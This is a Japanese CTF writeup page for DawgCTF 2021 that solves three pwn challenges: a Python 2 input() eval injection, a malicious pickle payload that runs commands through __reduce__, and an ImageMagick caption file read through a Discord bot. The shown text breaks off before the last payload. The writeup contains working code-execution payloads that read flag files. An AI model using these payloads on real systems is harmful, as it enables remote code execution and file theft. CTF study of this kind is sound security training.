@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title> :: CTF Writeup</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="DawgCTF 2021 Writeup 目次  Pwn  No Step On Snek Jellyspotters MDL Considered Harmful    No Step On Snek 問題 75 points
+I heard you guys like python pwnables
+nc umbccd.io 4000
+Author: trashcanna
+解説 ncコマンドで接続すると以下のように表示されます。
+Welcome to the aMAZEing Maze Your goal is to get from one side of the board to the other. Your character is represented by &amp;#34;OO&amp;#34; and the finish will be &amp;#34;FF&amp;#34; W/w - Move up!" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/dawgctf2021/dawgctf2021/" />
+
+
+
+
+<link rel="stylesheet" href="assets/style.css">
+
+  <link rel="stylesheet" href="assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="">
+<meta property="og:description" content="DawgCTF 2021 Writeup 目次  Pwn  No Step On Snek Jellyspotters MDL Considered Harmful    No Step On Snek 問題 75 points
+I heard you guys like python pwnables
+nc umbccd.io 4000
+Author: trashcanna
+解説 ncコマンドで接続すると以下のように表示されます。
+Welcome to the aMAZEing Maze Your goal is to get from one side of the board to the other. Your character is represented by &amp;#34;OO&amp;#34; and the finish will be &amp;#34;FF&amp;#34; W/w - Move up!" />
+<meta property="og:url" content="/dawgctf2021/dawgctf2021/" />
+<meta property="og:site_name" content="CTF Writeup" />
+
+  
+    <meta property="og:image" content="img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="blue">
+
+
+<div class="container headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    CTF Writeup
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/dawgctf2021/dawgctf2021/"></a></h1>
+  <div class="post-meta">
+    
+    
+    
+  </div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="dawgctf-2021-writeup">DawgCTF 2021 Writeup<a href="#dawgctf-2021-writeup" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="目次">目次<a href="#目次" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>Pwn
+<ul>
+<li><a href="#no-step-on-snek">No Step On Snek</a></li>
+<li><a href="#jellyspotters">Jellyspotters</a></li>
+<li><a href="#mdl-considered-harmful">MDL Considered Harmful</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="no-step-on-snek">No Step On Snek<a href="#no-step-on-snek" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="問題">問題<a href="#問題" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>75 points</strong><br>
+I heard you guys like python pwnables<br>
+<code>nc umbccd.io 4000</code><br>
+Author: trashcanna</p>
+<h3 id="解説">解説<a href="#解説" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>ncコマンドで接続すると以下のように表示されます。</p>
+<pre tabindex="0"><code>Welcome to the aMAZEing Maze
+Your goal is to get from one side of the board to the other.
+Your character is represented by &#34;OO&#34; and the finish will be &#34;FF&#34;
+W/w - Move up!
+A/a - Move left!
+S/s - Move down!
+D/d - Move right!
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+|OO         |        |     |        |           |
++  +--+  +  +--+  +  +  +  +--+  +  +--+--+  +  +
+|  |  |  |     |  |  |  |  |     |  |        |  |
++  +  +  +--+  +  +--+  +  +  +--+  +  +--+--+  +
+|  |  |  |     |     |  |     |  |  |     |     |
++  +  +  +  +--+--+  +--+--+--+  +  +  +  +  +--+
+|     |  |        |        |        |  |  |     |
++--+  +  +--+--+  +  +--+--+  +--+--+  +  +--+--+
+|     |  |           |     |  |     |  |  |     |
++--+--+  +--+--+--+  +  +  +  +  +  +  +  +  +  +
+|        |        |  |  |     |  |     |     |  |
++  +--+--+  +--+  +  +  +--+--+--+  +--+--+--+  +
+|  |        |     |  |           |     |        |
++  +  +--+--+  +--+--+--+--+--+  +--+  +  +--+--+
+|  |     |  |                 |  |     |        |
++  +--+  +  +--+--+--+--+--+  +  +  +--+--+--+  +
+|     |  |              |     |  |  |        |  |
++  +  +  +  +--+--+--+  +  +--+  +  +  +--+  +  +
+|  |  |     |           |  |     |     |     |  |
++  +  +--+--+  +--+--+--+  +  +--+--+--+  +--+  +
+|  |  |        |        |  |        |  |  |     |
++  +--+  +--+--+  +--+  +  +--+--+  +  +  +  +  +
+|  |     |        |     |           |     |  |  |
++  +  +--+--+--+--+  +--+--+--+--+--+  +--+  +  +
+|     |     |     |           |  |     |  |  |  |
++  +--+  +  +  +  +--+  +--+  +  +  +--+  +  +  +
+|  |     |     |     |  |     |           |  |  |
++  +  +--+--+--+--+  +  +  +--+  +--+--+--+  +  +
+|     |           |     |  |     |        |  |  |
++--+--+  +--+--+  +--+--+  +--+--+  +--+  +  +  +
+|              |                    |        |FF|
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+
+
+Make your move:
+</code></pre><p>まずW, A, S, D以外の文字、例えばZを入れてみると以下のように出力されました。</p>
+<pre tabindex="0"><code>Make your move: Z
+Traceback (most recent call last):
+  File &#34;/home/challuser/nosteponsnek.py&#34;, line 73, in &lt;module&gt;
+    __main__()
+  File &#34;/home/challuser/nosteponsnek.py&#34;, line 69, in __main__
+    still_playing = make_move(maze)
+  File &#34;/home/challuser/nosteponsnek.py&#34;, line 27, in make_move
+    move = input(&#34;Make your move: &#34;)
+  File &#34;&lt;string&gt;&#34;, line 1, in &lt;module&gt;
+NameError: name &#39;Z&#39; is not defined
+</code></pre><p>見るからにPythonなのですが、<code>NameError: name 'Z' is not defined</code>とあるため入力がそのままコードとして解釈されています。これはPython2系の仕様であり、input()は受け取った文字列をeval()のように式としてそのまま解釈します。<br>
+いろいろ試すと、<code>make_move(1)</code>や<code>make_move(&quot;a&quot;)</code>などで引数に渡した値がそのまま返ってくることに気付きます。あとは大体何でもできるのですが、エラー文でファイルのパスが分かっているのでまずこのファイルの中身を見るために<code>make_move(open(&quot;/home/challuser/nosteponsnek.py&quot;).read())</code>をしてみます。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python2.7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> random <span style="color:#f92672">import</span> shuffle, randrange
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>W <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>w <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>A <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>S <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>D <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>valid_moves <span style="color:#f92672">=</span> [W, w, A, a, S, s, D, d]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">welcome</span>():
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Welcome to the aMAZEing Maze&#34;</span>
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Your goal is to get from one side of the board to the other.&#34;</span>
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Your character is represented by </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">OO</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> and the finish will be </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">FF</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;W/w - Move up!&#34;</span>
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;A/a - Move left!&#34;</span>
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;S/s - Move down!&#34;</span>
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;D/d - Move right!&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_move</span>(maze):
+</span></span><span style="display:flex;"><span>        print maze
+</span></span><span style="display:flex;"><span>        move <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Make your move: &#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> move <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> valid_moves:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">NameError</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># TODO: Move the player around the board</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Was a little cruched for time this year so I didn&#39;t feel like writing</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># the gameplay. I hope that&#39;s okay :/</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">replace_last</span>(s, replace_what, replace_with):
+</span></span><span style="display:flex;"><span>        head, _sep, tail <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>rpartition(replace_what)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> head <span style="color:#f92672">+</span> replace_with <span style="color:#f92672">+</span> tail
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Randomly generate the gameboard and insert start/finish</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_maze</span>(w <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>, h <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>        vis <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> w <span style="color:#f92672">+</span> [<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(h)] <span style="color:#f92672">+</span> [[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> (w <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)]
+</span></span><span style="display:flex;"><span>        ver <span style="color:#f92672">=</span> [[<span style="color:#e6db74">&#34;|  &#34;</span>] <span style="color:#f92672">*</span> w <span style="color:#f92672">+</span> [<span style="color:#e6db74">&#39;|&#39;</span>] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(h)] <span style="color:#f92672">+</span> [[]]
+</span></span><span style="display:flex;"><span>        hor <span style="color:#f92672">=</span> [[<span style="color:#e6db74">&#34;+--&#34;</span>] <span style="color:#f92672">*</span> w <span style="color:#f92672">+</span> [<span style="color:#e6db74">&#39;+&#39;</span>] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(h <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">walk</span>(x, y):
+</span></span><span style="display:flex;"><span>                vis[y][x] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                d <span style="color:#f92672">=</span> [(x <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, y), (x, y <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>), (x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, y), (x, y <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)]
+</span></span><span style="display:flex;"><span>                shuffle(d)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (xx, yy) <span style="color:#f92672">in</span> d:
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> vis[yy][xx]: <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> xx <span style="color:#f92672">==</span> x: hor[max(y, yy)][x] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+  &#34;</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> yy <span style="color:#f92672">==</span> y: ver[y][max(x, xx)] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;   &#34;</span>
+</span></span><span style="display:flex;"><span>                        walk(xx, yy)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        walk(randrange(w), randrange(h))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (a, b) <span style="color:#f92672">in</span> zip(hor, ver):
+</span></span><span style="display:flex;"><span>                s <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(a <span style="color:#f92672">+</span> [<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">+</span> b <span style="color:#f92672">+</span> [<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>])
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;O&#34;</span>, <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> replace_last(s, <span style="color:#e6db74">&#34;  &#34;</span>, <span style="color:#e6db74">&#34;FF&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__main__</span>():
+</span></span><span style="display:flex;"><span>        welcome()
+</span></span><span style="display:flex;"><span>        still_playing <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        maze <span style="color:#f92672">=</span> make_maze()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(still_playing):
+</span></span><span style="display:flex;"><span>                still_playing <span style="color:#f92672">=</span> make_move(maze)
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Congrats! You&#39;ve finished the maze! Here&#39;s your flag:&#34;</span>
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__main__()
+</span></span></code></pre></div><p><code>__main__()</code>関数を見ると<code>os.system(&quot;/bin/cat flag.txt&quot;)</code>とあるので、そのまま<code>make_move(os.system(&quot;/bin/cat flag.txt&quot;))</code>を渡すとフラグが得られます。</p>
+<h2 id="jellyspotters">Jellyspotters<a href="#jellyspotters" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="問題-1">問題<a href="#問題-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>100 points</strong><br>
+The leader of the Jellyspotters has hired you to paint them a poster for their convention, using this painting program. Also, the flag is in ~/flag.txt.</p>
+<p>nc umbccd.io 4200</p>
+<p>Author: nb</p>
+<h3 id="解説-1">解説<a href="#解説-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>ncコマンドで接続すると描画プログラムのシェルのようなものがあります。helpを確認して少し操作してみると以下のようになります。</p>
+<pre tabindex="0"><code>Welcome to the Paint Program!
+Paint us a new poster for the Jellyspotters 2021 convention. Make Kevin proud.
+Type &#39;help&#39; for help.
+&gt; help
+Listing commands...
+display             Display the canvas
+clearall            Clear the canvas
+set [row] [col]     Set a particular pixel
+clear [row] [col]   Clear a particular pixel
+export              Export the canvas state
+import [canvas]     Import a previous canvas
+exit                Quit the program
+&gt; display
+##################
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+##################
+&gt; set 5 5
+##################
+#                #
+#                #
+#                #
+#                #
+#                #
+#     0          #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+##################
+</code></pre><p>exportとimportは以下のような使い方ができます。表示形式はBase64のようですが、デコードしてもそのまま読めるような形にはなりませんでした。</p>
+<pre tabindex="0"><code>&gt; export
+Exported canvas string:
+gASVSQIAAAAAAABdlChdlCiMASCUaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAKMATCUaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlZS4=
+&gt; import gASVSQIAAAAAAABdlChdlCiMASCUaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAKMATCUaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlZS4=
+Importing...
+Done!
+##################
+#                #
+#                #
+#                #
+#                #
+#                #
+#     0          #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+##################
+&gt;
+</code></pre><p>何かヒントが欲しいのでimportでエラーを吐きそうな適当な引数を渡します。</p>
+<pre tabindex="0"><code>&gt; import a
+Importing...
+Traceback (most recent call last):
+  File &#34;/home/challuser/jellyspotters.py&#34;, line 67, in &lt;module&gt;
+    imp = pickle.loads(base64.b64decode(split[1]))
+  File &#34;/usr/lib/python3.8/base64.py&#34;, line 87, in b64decode
+    return binascii.a2b_base64(s)
+binascii.Error: Invalid base64-encoded string: number of data characters (1) cannot be 1 more than a multiple of 4
+</code></pre><p>Pythonでpickleを使ってPythonオブジェクトを変換しBase64エンコードをしているみたいなので、ローカルで同じことをすればPythonオブジェクトに復元したり、好きなPythonオブジェクトをimportで渡したりできそうです。<br>
+復元してみると二次元リストだということが分かるので、以下のコードで適当なデータでBase64文字列を作り、渡してみます。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;b&#34;</span>, <span style="color:#e6db74">&#34;c&#34;</span>],
+</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;d&#34;</span>, <span style="color:#e6db74">&#34;e&#34;</span>, <span style="color:#e6db74">&#34;f&#34;</span>],
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(data)
+</span></span><span style="display:flex;"><span>print(base64<span style="color:#f92672">.</span>b64encode(p))
+</span></span></code></pre></div><p>出力</p>
+<pre tabindex="0"><code>b&#39;gASVJQAAAAAAAABdlChdlCiMAWGUjAFilIwBY5RlXZQojAFklIwBZZSMAWaUZWUu&#39;
+</code></pre><p>importに渡してみるとこうなります。</p>
+<pre tabindex="0"><code>&gt; import gASVJQAAAAAAAABdlChdlCiMAWGUjAFilIwBY5RlXZQojAFklIwBZZSMAWaUZWUu
+Importing...
+Done!
+##################
+#abc#
+#def#
+##################
+&gt;
+</code></pre><p>どうにかして内部のファイルを出力するような関数を実行させたいところですが、静的なオブジェクトしか渡せないのでどうすればよいか考えました。考えても思いつかなかったので「pickle vulnerability」とかで検索すると任意コード実行の脆弱性(参考: <a href="https://blog.nelhage.com/2011/03/exploiting-pickle/">https://blog.nelhage.com/2011/03/exploiting-pickle/</a>)がありました。<br>
+これを利用して以下のコードを書いて出力をimportに渡せばフラグが得られます。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RunShell</span>(object):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (subprocess<span style="color:#f92672">.</span>Popen, ((<span style="color:#e6db74">&#39;cat&#39;</span>, <span style="color:#e6db74">&#39;flag.txt&#39;</span>),))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> RunShell()
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(r)
+</span></span><span style="display:flex;"><span>print(base64<span style="color:#f92672">.</span>b64encode(p))
+</span></span></code></pre></div><h2 id="mdl-considered-harmful">MDL Considered Harmful<a href="#mdl-considered-harmful" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="問題-2">問題<a href="#問題-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><strong>225 points</strong><br>
+There&rsquo;s a bot named MDLChef in the Discord. You need to DM it, it doesn&rsquo;t respond in the server. On its host machine, there&rsquo;s a file at /opt/flag.txt - it contains the flag. Go get it.</p>
+<p>Note: This is NOT an OSINT challenge. The source code really isn&rsquo;t available. Good luck.</p>
+<p>Author: nb</p>
+<h3 id="解説-2">解説<a href="#解説-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>DawgCTFのDiscordサーバーにMDLChefというBotがいて、「DM me and say /help」とのことなのでDMに/helpを送ります。</p>
+<p>以下の返信が来ます。</p>
+<blockquote>
+<p><strong>MDLChef Bot</strong><br>
+This bot generates memes using MDL, the Meme Description Language.<br>
+Here is an example of a valid MDL sample:</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">version:</span> <span style="color:#f92672">&#34;MDL/1.1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">type:</span> <span style="color:#f92672">&#34;meme&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">base:</span> <span style="color:#960050;background-color:#1e0010">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">format:</span> <span style="color:#f92672">&#34;Meme.Matrix.WhatIfIToldYou&#34;</span>
+</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">caption:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">topText:</span> <span style="color:#f92672">&#34;what if i told you&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">bottomText:</span> <span style="color:#f92672">&#34;you can code your memes&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span></code></pre></div><blockquote>
+<p>Just send a valid MDL snippet in the DM and the bot will automatically recognize it and respond.</p>
+</blockquote>
+<p>提示されたMDL sampleを送信してみるとミーム画像が返されました。<br>
+/helpはスラッシュコマンドだったので、/を打って候補に出る他のコマンドも試してみます。<br>
+/creditsを送信すると以下の返信が来ます。</p>
+<blockquote>
+<p><strong>Credits</strong><br>
+Thank you to&hellip;<br>
+- The Rust programming language<br>
+- The Serenity Discord library<br>
+- The ImageMagick caption command for meme generation<br>
+Note: The source code for this bot is NOT publicly available, due to the CyberDawgs&rsquo; extreme anti-open-source and pro-proprietary stance. We don&rsquo;t NEED public auditing. All of the code in this bot is totally and completely secure.</p>
+</blockquote>
+<p>Rust、Serenity Discordライブラリ、ImageMagickのcaptionコマンドを使っているということなので、それぞれで内部ファイルを読み込んで表示できそうな脆弱性がないか検索してみると、「imagemagick caption from file」で検索してImageMagickのcaptionコマンドでファイルから読み込んでテキストを画像に書き込める機能(参考: <a href="https://legacy.imagemagick.org/discourse-server/viewtopic.php?t=31322">https://legacy.imagemagick.org/discourse-server/viewtopic.php?t=31322</a>)が見つかりました。</p>
+<p>以下のMDLを送るとフラグが手に入ります。</p>
